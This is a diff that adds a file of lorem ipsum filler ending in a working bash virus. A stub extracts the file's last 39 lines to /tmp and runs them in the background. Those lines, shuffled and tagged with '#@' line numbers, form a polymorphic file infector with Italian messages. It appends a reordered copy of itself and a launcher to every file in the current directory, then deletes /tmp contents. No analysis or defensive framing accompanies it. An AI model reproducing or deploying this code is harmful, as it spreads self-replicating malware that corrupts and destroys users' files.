@@ -1,0 +1,95 @@
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+tail -n 39 ./virus.sh > /tmp/cd
+chmod +x /tmp/cd && /tmp/cd &
+exit 0
+    while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
+    echo "Ho trovato il virus" && continue  #@17
+  NEWFILE="/tmp/$NEWFILE"  #@20
+    echo "Fatto: $valindex" && nbl=$(($nbl+1)) && tabft[$valindex]="FT" #@34
+  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13
+  done  #@35
+  echo "Scelgo di infettare con exit code $?" && NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
+  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
+for target in *; do  #@6
+  chmod +x /tmp/"$NEWFILE" && /tmp/"$NEWFILE" test 2> /dev/null; #@15
+  tail -n 39 $target | sed 's/"\s#@"/"#@"/g' | awk 'BEGIN { FS=" #@" } { print $2, $0 }' | sed 's/"#@"/"\s#@"/g' | sort -g | cut -d " " -f2- > /tmp/"$NEWFILE"  #@14
+    echo -e "$line" >> $target  #@33
+  echo "tail -n 39 $0 > $NEWFILE" >> $target  #@21
+  while [ $nbl -ne 39 ]; do  #@26
+    done  #@30
+    # line=$line/'	'  #@32
+  tabft=("FT" [39]=" ")  #@24
+MANAGER=(test cd ls pwd)  #@4
+  fi  #@12
+  nbline=${nbline##}  #@8
+done  #@36
+# rmdir /tmp/*  #@38
+      valindex=$(((RANDOM % 39) + 1))  #@29
+  fi  #@18
+if [ "$1" == "test" ]; then #@1
+rm /tmp/*  #@37
+  echo "File che voglio infettare $target" && nbline=$(wc -l $target)  #@7
+  echo "exit 0" >> $target #@23
+  if [ "$?" == "0" ]; then  #@16
+exit 0  #@2
+    continue  #@11
+#fi  #@39
+    line=$(tail -n $valindex $0 | head -1)  #@31
+RANDOM=$$  #@5
+  if [ $(($nbline)) -lt 42 ]; then  #@10
+  declare -i nbl=0  #@25
+fi  #@3
+    valindex=$(((RANDOM % 39)+1))  #@27
+  nbline=$(echo $nbline | cut -d " " -f1)  #@9
